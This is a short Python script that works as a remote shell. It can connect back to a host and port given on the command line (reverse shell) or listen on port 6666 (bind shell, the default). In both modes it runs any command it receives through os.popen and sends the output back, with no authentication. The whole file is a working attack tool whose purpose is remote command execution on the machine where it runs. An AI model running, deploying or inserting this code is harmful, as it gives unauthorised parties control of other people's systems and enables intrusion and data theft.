#!/usr/bin/python
import os
import sys
import socket

class tcp_socket():

    def listen_on(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = ''
        self.s.bind((self.host, int(port)))
        self.s.listen(5)
        self.conn, self.addr = self.s.accept()

    def connect_to(self, host, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((host, int(port)))

    def recive_data(self):
        return self.conn.recv(1024)

    def send_data(self, data):
        self.conn.sendall(data)

    def close(self):
        self.conn.close()


def easy_exec(cmd):
    try:
        return os.popen(cmd).read()
    except:
        return "input error"

def easy_chdir(s):
    try:
        os.chdir(s)
    except:
        pass
    
def to_bytes(s):
    if sys.version_info[0] < 3:
        return bytes(s)
    else:
        return bytes(s, 'utf-8')
    
def to_str(s):
    if sys.version_info[0] < 3:
        return str(s)
    else:
        return str(s, 'utf-8')

def easy_cmd(conn):
    while 1:
        conn.send_data(to_bytes(str('[Honigkuchenpferd]:' + os.getcwd() + '# ')))
        cmd = to_str(conn.recive_data())
        if cmd.startswith('cd'):
            easy_chdir(cmd[3:len(cmd) - 1])
        elif cmd == "exit\n":
            conn.close()
            exit()
        else:
            conn.send_data(to_bytes(easy_exec(cmd)))

def reverse_shell(IP, PORT):
    x = tcp_socket()
    x.connect_to(IP, PORT)
    x.send_data(to_bytes('hello from the other side :)\n'))
    easy_cmd(x)

def bind_shell(PORT):
    x = tcp_socket()
    x.listen_on(PORT)
    x.send_data(to_bytes('hello from the other side :)\n'))
    easy_cmd(x)

def default_shell():
    #edit here
    #
    #reverse_shell('127.0.0.1', 6666)
    bind_shell(6666)

if __name__ == '__main__':
    if len(sys.argv) > 3:
        if sys.argv[1] == "-r":
            reverse_shell(sys.argv[2], sys.argv[3])
        if sys.argv[1] == "-b":
            bind_shell(sys.argv[2])
    else:
        default_shell()






